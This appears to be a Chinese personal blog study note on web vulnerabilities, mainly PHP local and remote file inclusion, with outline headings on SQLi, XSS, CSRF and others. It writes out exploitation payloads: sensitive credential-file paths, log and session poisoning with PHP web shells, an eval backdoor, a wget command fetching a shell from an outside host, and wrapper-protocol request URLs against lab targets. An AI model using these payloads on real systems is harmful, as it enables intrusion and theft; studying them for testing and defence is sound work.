<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43511094/article/details/123505330">https://blog.csdn.net/qq_43511094/article/details/123505330</a></p>
<h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h3><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>在PHP的配置文件中，这个值如果为On的话，就表示对用户提交的数据进行判断解析，如包括有get、post、cookie传过来的数据会增加转义字符’’，使得这些数据不会影响程序发生错误，尤其是防止数据库语句因为没有转义而发生的sql注入漏洞。</p>
<h4 id="allow-url-fopen"><a href="#allow-url-fopen" class="headerlink" title="allow_url_fopen"></a>allow_url_fopen</h4><p>在PHP的配置文件中，如果这个值为<strong>On</strong>的话，就表示可以允许打开URL文件，默认是<strong>开启</strong>的</p>
<h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><p>在PHP的配置文件中，如果这个值为<strong>On</strong>的话，就表示可以允许include函数或者require函数<strong>接收URL远程</strong>文件，默认是关闭的</p>
<p>其中，allow_url_fopen默认开启保证了我们能够打开远端文件，而allow_url_include的关闭也一定程度上避免了include和require所带来的文件包含漏洞，所以他们的预设是基于此才默认打开或者关闭的。</p>
<p>但实际上他们只是对<code>URL</code>文件进行了<strong>限制</strong>，只能影响<code>http/ftps</code>的调用，我们任然可以用其他的伪协议进行突破，比如php://或者data://，这两个协议仍然不收他们关闭的影响</p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>**include()**：当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行</p>
<p>**include_once()**：功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
<p><strong>require()<strong>：require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行 。使用require()函数包含文件时，只要程序</strong>一执行，立即调用</strong>文件，而include()只有程序执行到函数时才调用 .require()在php程序执行前执行，会先读入 require 所指定引入的文件，使它变成 PHP 程序网页的一部份。</p>
<p>**require_once()**：它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</p>
<h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>​        本地文件包含，当服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行</p>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/PANDA-Mosen/p/13262638.html">https://www.cnblogs.com/PANDA-Mosen/p/13262638.html</a></p>
<h5 id="包含一些敏感的配置文件"><a href="#包含一些敏感的配置文件" class="headerlink" title="包含一些敏感的配置文件"></a>包含一些敏感的配置文件</h5><p><strong>windows常见的敏感文件路径:</strong></p>
<blockquote>
<p>C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br>C:\Windows\win.ini //Windows系统的一个基本系统配置文件</p>
</blockquote>
<p><strong>Linux常见的敏感文件路径:</strong></p>
<blockquote>
<p>/root/.ssh/authorized_keys<br>/root/.ssh/id_rsa<br>/root/.ssh/id_ras.keystore<br>/root/.ssh/known_hosts //记录每个访问计算机用户的公钥<br>/etc/passwd<br>/etc/shadow<br>/etc/my.cnf //mysql配置文件<br>/etc/httpd/conf/httpd.conf //apache配置文件<br>/root/.bash_history //用户历史命令记录文件<br>/root/.mysql_history //mysql历史命令记录文件<br>/proc/mounts //记录系统挂载设备<br>/porc/config.gz //内核配置文件<br>/var/lib/mlocate/mlocate.db //全文件路径<br>/porc/self/cmdline //当前进程的cmdline参数</p>
</blockquote>
<h5 id="包含用户上传文件"><a href="#包含用户上传文件" class="headerlink" title="包含用户上传文件"></a>包含用户上传文件</h5><p>​    存在一个上传点，上传一个木马然后进行<code>getshell</code></p>
<h5 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h5><p><strong>1.包含Apache日志文件</strong></p>
<p>在用户发起请求时，服务器会将</p>
<p>请求写入<code>access.log</code>(会记录访问IP、访问链接、Referer和User-Agent等)</p>
<p>当请求错误时将错误写入<code>error.log</code></p>
<p><strong>利用条件：</strong></p>
<p>日志文件的存储路径，并且日志文件可读。</p>
<p>①<code>apache</code>的日志文件可以通过<code>phpinfo</code>页面来查询，<code>apache2handler</code> 中的<code>server root</code>就是<code>apache</code>的安装路径，那么日志文件应该就是在这个路径下的<code>log</code>s目录中</p>
<p>②或者通过猜测常见日志文件的路径<code>/usr/local/apache/logs/error_log</code>或者<code>access_log</code></p>
<p>③也可用通过先包含配置文件来确定日志文件路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?page=/etc/init.d/httpd</span><br><span class="line">index.php?page=/etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure>

<p><strong>利用方式：</strong></p>
<p>因为会自动url编码，会导致无法利用，所以抓包再请求，然后在log文件中看见payload，直接读取包含<code>payload</code>的<code>log</code>文件路径进行<code>getshell</code></p>
<p><strong>2.包含SSH日志文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[hack];?&gt;&#x27;@192.168.0.1</span><br></pre></td></tr></table></figure>

<p>这样把用户名写成<code>phpinfo</code>，<code>SSH</code>的登陆日志就会把此次的登陆行为记录到日志中，利用包含漏洞<code>getshell</code></p>
<h5 id="包含Session"><a href="#包含Session" class="headerlink" title="包含Session"></a>包含Session</h5><p>​        <code>cookie</code>存在客户端，<code>session</code>存在服务端，<code>cookie</code>一般用来保存用户得账户密码，<code>session</code>一般用来跟踪会话。</p>
<p>​        一般对于登陆点存在注册用户的，那么就可以起一个为<code>payload</code>的名字，这样会将<code>payload</code>保存在<code>session</code>文件中</p>
<p>利用条件：</p>
<p><strong>①session文件路径已知</strong></p>
<p><strong>②且其中部分内容可控制</strong></p>
<p><code>session</code>文件路径位置可以通过<code>phpinfo</code>页面来获取： <code>session.save_path</code>参数</p>
<p>也可以猜测常见的一些session存储位置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/lib/php/sess_[PHPSESSID]</span><br><span class="line">/tmp/sess_[PHPSESSID]</span><br></pre></td></tr></table></figure>

<p><strong>利用方式：</strong></p>
<p>访问漏洞页面，在参数中构造payload</p>
<p>比如在url中读入一句话木马，然后通过抓包获取<code>session</code>文件名，再直接利用文件包含漏洞跨目录包含<code>session</code>文件利用蚁剑进行<code>getshell</code></p>
<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p>​        <code>PHPINFO</code>可以告诉我们临时文件的随机生成的文件名和位置。</p>
<p>​        在php发送post包的时候，数据包里如果包含文件区块，则会将这个文件保存为一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>）这个临时文件，在请求结束后就会被删除。但是在<code>phpinfo</code>页面会把这些请求上下文都打印出来，如果向<code>phpinfo</code>页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。当我们找不到可利用的文件时，我们就可以利用这方法找到临时文件名，然后进行包含，但是文件包含漏洞的页面一般与<code>phpinfo</code>页面不在一起，那理论上我们应该先发数据包给<code>phpinfo</code>页面，然后从返回包匹配出临时用户名，从而把临时用户名发给文件包含漏洞页面，形成<code>getshell</code>。当<code>phpinfo</code> 的请求结束了时候，临时文件也就被删除了。</p>
<p><strong>这个时候就需要用到条件竞争，具体流程如下：</strong></p>
<p>1、发送包含了<code>webshell</code>的上传数据包给<code>phpinfo</code>页面，这个数据包的<code>header</code>、<code>get</code>等位置需要塞满垃圾数据</p>
<p>2、因为<code>phpinfo</code>页面会将所有数据都打印出来，1中的垃圾数据会将整个<code>phpinfo</code>页面撑得非常大</p>
<p>3、<code>php</code>默认的输出缓冲区大小为<code>4096</code>，可以理解为<code>php</code>每次返回<code>4096</code>个字节给<code>socket</code>连接</p>
<p>4、所以，我们直接操作原生<code>socket</code>，每次读取<code>4096</code>个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</p>
<p>5、此时，第一个数据包的<code>socket</code>连接实际上还没结束，因为php还在继续每次输出<code>4096</code>个字节，所以临时文件此时还没有删除</p>
<p>6、利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终<code>getshell</code></p>
<p>(利用<code>file_put_contents</code>函数写入<code>&lt;?=eval($_REQUEST[1])?&gt;</code>一句话后门到<code>/tmp/g</code>文件中,再利用蚁剑连接)</p>
<h5 id="包含数据库、缓存文件"><a href="#包含数据库、缓存文件" class="headerlink" title="包含数据库、缓存文件"></a>包含数据库、缓存文件</h5><h5 id="包含-proc-self-environ"><a href="#包含-proc-self-environ" class="headerlink" title="包含/proc/self/environ"></a>包含/proc/self/environ</h5><p>①先利用<code>etc/passwd</code> 来检测是否存在，然后层层穿越直到显示正常的文件信息，比如<code>www.website.com/view.php?page=../../../../../etc/passwd</code> </p>
<p>②然后把文件替换为<code>proc/self/environ</code>，检查是否可用访问。</p>
<p>③如果可以访问，则可以注入我们的代码在用户代理HTTP头。</p>
<p>假设url为 <code>www.website.com/view.php?page=../../../../../proc/self/environ</code> </p>
<p>选择User-Agent 写代码如下： </p>
<p><code>&lt;?system(&#39;wget http://hack-bay.com/Shells/gny.txt -O shell.php&#39;);?&gt;</code> 我们的命令让其下载了<code>shell</code>文件，并保存在<code>shell.php</code>中。（也可以利用<code>exec()</code>）</p>
<p>③然后访问<code>www.website.com/shell.php</code>发现已经成功注入了</p>
<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>伪协议实际上就是支持的协议与封装协议</p>
<p>在使用文件包含漏洞时，必须要能知道其绝对路径</p>
<p>参考（<a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087%EF%BC%89">https://segmentfault.com/a/1190000018991087）</a></p>
<h5 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h5><p>用来访问本地文件系统。</p>
<p>条件：<code>allow_url_fopen: off/on</code>， <code>allow_url_include: off/on</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux	：http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd		绝对路径</span><br><span class="line">Windows	：http://192.168.6.128:8001/vulnerabilities/fi/?page=file:///C:\DVWA-master\vulnerabilities\fi\1.txt		绝对路径</span><br></pre></td></tr></table></figure>

<h5 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h5><p><code>php://</code>伪协议主要有<code>php://input</code>与<code>php://filter</code></p>
<p><code>php://input</code>：将POST输入流当做PHP代码执行。其只受   <code>allow_url_include</code>参数的影响，<code>allow_url_fopen</code>开关与此伪协议无关。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/vulnerabilities/fi/?page=php://input HTTP/1.1</span><br><span class="line">Host: 192.168.243.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: security=low; PHPSESSID=ncmfpqj0d0r6nopn4qrsftdfd2; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 17</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo()?&gt;</span><br><span class="line"></span><br><span class="line">//抓包之后，将GET改为了POST，然后在包的最后传入php语句&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>

<p><code>php://filter</code>伪协议：不受<code>allow_url_fopen</code>与<code>allow_url_include</code>参数的影响.</p>
<p>它可以获取指定文件源码。<code>php://filter:/=&lt;action&gt;=&lt;name&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/resource=./1.txt		相对路径</span><br><span class="line">http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/resource=file:///C:\DVWA-master\vulnerabilities\fi\1.txt		绝对路径</span><br><span class="line">http://127.0.0.1/FI/LFI.php?file=php://filter/resource=file:///etc/passwd</span><br><span class="line"></span><br><span class="line">此协议主要用于读取php源代码时会用到</span><br><span class="line">http://192.168.6.128:8001/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=./1.txt			以base64编码将文件内容输出</span><br></pre></td></tr></table></figure>

<h5 id="zip-amp-bzip2-amp-zlib"><a href="#zip-amp-bzip2-amp-zlib" class="headerlink" title="zip://&amp; bzip2:// &amp; zlib://"></a>zip://&amp; bzip2:// &amp; zlib://</h5><p>条件：<code>allow_url_fopen: off/on</code> ，<code>allow_url_include: off/on</code></p>
<p>1 、现将要执行 <code>php</code> 代码写好并且命名为 <code>a.tx</code>t，将 <code>a.txt</code> 进行 <code>zip</code> 压缩，命名为 <code>a.zip</code>，如果可以上传 <code>zip</code> 文件便直接上传，如若不能可将 <code>a.zip</code> 命名为 <code>a.jpg</code> 上传。</p>
<p>利用<code>zip</code>伪协议来直接读取<code>a.txt</code>中的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.zip%23a.txt </span><br><span class="line">http://127.0.0.1/FI/LFI.php?file=zip://D:/phpstudy/PHPTutorial/WWW/a.jpg%23a.txt</span><br></pre></td></tr></table></figure>

<p>2、压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.bz2</code> 并上传（同样支持任意后缀名）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure>

<p>3、压缩 <code>phpinfo.txt</code> 为 <code>phpinfo.gz</code> 并上传（同样支持任意后缀名）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure>

<h5 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h5><p>条件：<code>allow_url_fopen: off/on</code> ,<code>allow_url_include: off/on</code>，php 版本大于等于php5.3.0</p>
<p>与zip有点类似，同样可以访问zip格式压缩包内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure>

<h5 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h5><p>条件：<code>allow_url_fopen: on</code> ，<code>allow_url_include: on</code></p>
<p><code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
<p>1、data://text/plain</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>2、data://text/plain;base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure>

<h5 id="http-amp-https"><a href="#http-amp-https" class="headerlink" title="http:// &amp; https://"></a>http:// &amp; https://</h5><p>条件：<code>allow_url_fopen: on</code> ，<code>allow_url_include: on</code></p>
<p>常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure>

<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>​        远程文件包含，是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = On</span><br><span class="line">allow_url_include = On，重启apache，即可生效</span><br></pre></td></tr></table></figure>

<p>两个配置选项均需要为On，才能远程包含文件成功。<br>另外一台需要开启apache</p>
<figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="keyword">get</span> install apache2</span><br><span class="line">/etc/<span class="keyword">init</span>.d/apache2 start</span><br></pre></td></tr></table></figure>

<h2 id="代码执行-命令执行"><a href="#代码执行-命令执行" class="headerlink" title="代码执行/命令执行"></a>代码执行/命令执行</h2><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>区别：一般执行的是上传代码，通过执行脚本代码调取操作系统命令。</p>
<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>需要调用一些可以用于执行系统命令的函数，比如PHP中使用的system、exec、shell_exec、passthru、popen、proc_popen等。当这些函数可以被用户所利用，则恶意的命令拼接到正常的命令上，形成命令执行。</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>区别：一般执行的是系统或者API命令，调用了操作系统的命令。</p>
<h4 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>在操作系统中，由于存在一些命令连接符，比如<code>&amp;</code>,<code>|</code>,<code>||</code></p>
<h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="数据库类型"><a href="#数据库类型" class="headerlink" title="数据库类型"></a>数据库类型</h3><h4 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h4><p>5.0以下没有information_schema，无法列表名只能爆破</p>
<p>UDF提权</p>
<p>MOF提权</p>
<p>MSSQL</p>
<h4 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h4><h4 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h4><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><h4 id="参数过滤"><a href="#参数过滤" class="headerlink" title="参数过滤"></a>参数过滤</h4><h4 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h4><h4 id="ODBC"><a href="#ODBC" class="headerlink" title="ODBC"></a>ODBC</h4><h4 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h4><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h3 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h3><p>关闭页面时清除session</p>
<p>referer</p>
<p>csrf_token</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><h3 id="防护-2"><a href="#防护-2" class="headerlink" title="防护"></a>防护</h3><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>反射型</p>
<p>DOM型</p>
<p>存储型</p>
<h3 id="防护-3"><a href="#防护-3" class="headerlink" title="防护"></a>防护</h3><p>escapeHTML</p>
<p>CSP</p>
<p>Http-only</p>
<p>输入输出过滤</p>
<p>长度限制</p>
<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><h4 id="防护-4"><a href="#防护-4" class="headerlink" title="防护"></a>防护</h4><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><h3 id="SOME攻击"><a href="#SOME攻击" class="headerlink" title="SOME攻击"></a>SOME攻击</h3><p>防护</p>
<p>移除JSONP函数</p>
<p>使用跨域AJAX请求</p>
<p>向API响应添加ACAO HEADER</p>

        </div>
        
            <div class="kratos-copyright text-center clearfix">
                <h5>本作品采用 <a rel="license nofollow" target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">知识共享署名-相同方式共享 4.0 国际许可协议</a> 进行许可</h5>
            </div>
        
        <footer class="kratos-entry-footer clearfix">
            
                <div class="post-like-donate text-center clearfix" id="post-like-donate">
                
                
                    <a class="share" href="javascript:;"><i class="fa fa-share-alt"></i> 分享</a>
                    <div class="share-wrap" style="display: none;">
    <div class="share-group">
        <a href="javascript:;" class="share-plain qq" onclick="share('qq');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-qq"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain qzone" onclick="share('qzone');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-star"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weixin pop style-plain" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weixin"></i>
            </div>
            <div class="share-int">
                <div class="qrcode" id="wechat-qr"></div>
                <p>打开微信“扫一扫”，打开网页后点击屏幕右上角分享按钮</p>
            </div>
        </a>
        <a href="javascript:;" class="share-plain weibo" onclick="share('weibo');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-weibo"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain facebook style-plain" onclick="share('facebook');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-facebook"></i>
            </div>
        </a>
        <a href="javascript:;" class="share-plain twitter style-plain" onclick="share('twitter');" rel="nofollow">
            <div class="icon-wrap">
                <i class="fa fa-twitter"></i>
            </div>
        </a>
    </div>
    <script type="text/javascript">
        $(()=>{
            new QRCode("wechat-qr", {
                text: "http://10vexh.github.io/2022/03/17/WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/",
                width: 150,
                height: 150,
                correctLevel : QRCode.CorrectLevel.H
            });
        });
        function share(dest) {
            const qqBase        = "https://connect.qq.com/widget/shareqq/index.html?";
            const weiboBase     = "https://service.weibo.com/share/share.php?";
            const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
            const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
            const twitterBase   = "https://twitter.com/intent/tweet?";
            const hostUrl       = "http://10vexh.github.io/2022/03/17/WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/";
            const title         = "「WEB基础漏洞」";
            const excerpt       = `WEB基础漏洞逻辑漏洞测试流程

1.正常找回密码
2.分析数据包
3.分析后台验证机制
4.修改数据包验证

漏洞点身份验证

暴力破解
弱加密
固定php中的session_id：
​    用户登录站点后得到了session，然...`;
            let _URL;
            switch (dest) {
                case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
                case "weibo"    : _URL = weiboBase+"url="+hostUrl+"&title="+title+excerpt;                                 break;
                case "qzone"    : _URL = qzoneBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";  break;
                case "facebook" : _URL = facebookBase+"u="+hostUrl;                                                        break;
                case "twitter"  : _URL = twitterBase+"text="+title+excerpt+"&url="+hostUrl;                                break;
            }
            window.open(_URL);
        };
    </script>
</div>
                
                </div>
            
            <div class="footer-tag clearfix">
                <div class="pull-left">
                <i class="fa fa-tags"></i>
                    
                </div>
                <div class="pull-date">
                <span>最后编辑：2022-05-20</span>
                </div>
            </div>
        </footer>
    </div>
    
        <nav class="navigation post-navigation clearfix" role="navigation">
            
            <div class="nav-previous clearfix">
                <a title=" BUUCTF做题记录（一）" href="/2022/02/20/BUUCTF做题记录（一）/">&lt; 上一篇</a>
            </div>
            
            
            <div class="nav-next clearfix">
                <a title=" CVE-2020-1938复现" href="/2022/04/22/CVE-2020-1938复现/">下一篇 &gt;</a>
            </div>
            
        </nav>
    
    
</article>

        

            </section>

        

                
            

<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
    
    
                <aside id="krw-about" class="widget widget-kratos-about clearfix">
    <div class="photo-background"></div>
    <div class="photo-wrapper clearfix">
        <div class="photo-wrapper-tip text-center">
            <img class="about-photo" src="/images/avatar.webp" />
        </div>
    </div>
    <div class="textwidget">
        <p class="text-center">水至清则无鱼</p>
    </div>
    <div class="site-meta">
        <a class="meta-item" href="/archives/">
            <span class="title">
                文章
            </span>
            <span class="count">
                10
            </span>
        </a>
        <a class="meta-item" href="/categories/">
            <span class="title">
                分类
            </span>
            <span class="count">
                0
            </span>
        </a>
        <a class="meta-item" href="/tags/">
            <span class="title">
                标签
            </span>
            <span class="count">
                0
            </span>
        </a>
    </div>
</aside>
            
                    <div class="sticky-area">
                
                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
    <div class="photo-background"></div>
    <h4 class="widget-title no-after">
        <i class="fa fa-compass"></i>
        文章目录
        <span class="toc-progress-bar"></span>
    </h4>
    <div class="textwidget">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E"><span class="toc-text">WEB基础漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-text">漏洞点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%9E%90%E6%94%BB%E5%87%BB"><span class="toc-text">解析攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-text">中间件解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache%EF%BC%9A%E4%BB%8E%E5%8F%B3%E5%BE%80%E5%B7%A6"><span class="toc-text">Apache：从右往左</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%EF%BC%9A-00%E6%88%AA%E6%96%AD"><span class="toc-text">Nginx：%00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS6-0%EF%BC%9A%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90%EF%BC%8C%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-text">IIS6.0：目录解析，文件解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS7-0-7-5-Nginx-lt-8-03%EF%BC%9AFast-CGI-php"><span class="toc-text">IIS7.0&#x2F;7.5 Nginx&lt;8.03：Fast-CGI *&#x2F;*.php*</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E"><span 